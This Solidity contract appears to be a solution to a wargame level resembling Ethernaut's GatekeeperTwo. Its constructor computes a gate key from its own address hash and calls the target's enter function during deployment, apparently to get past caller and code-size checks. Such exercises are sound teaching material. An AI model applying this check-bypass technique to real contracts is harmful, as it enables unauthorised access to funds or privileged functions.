// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.6.12;

contract GateDestroyerTwo {
  // ENTER_SELECTOR = bytes8(keccak256(bytes("enter(bytes8)")))
  bytes4 constant ENTER_SELECTOR = 0x3370204e;

  constructor(address gateKeeperAddr) public {
    bytes8 gateKey =
      bytes8(
        uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
          (uint64(0) - 1)
      );
    (bool result, ) =
      gateKeeperAddr.call(abi.encodeWithSelector(ENTER_SELECTOR, gateKey));
    require(result, "call not success");
  }
}
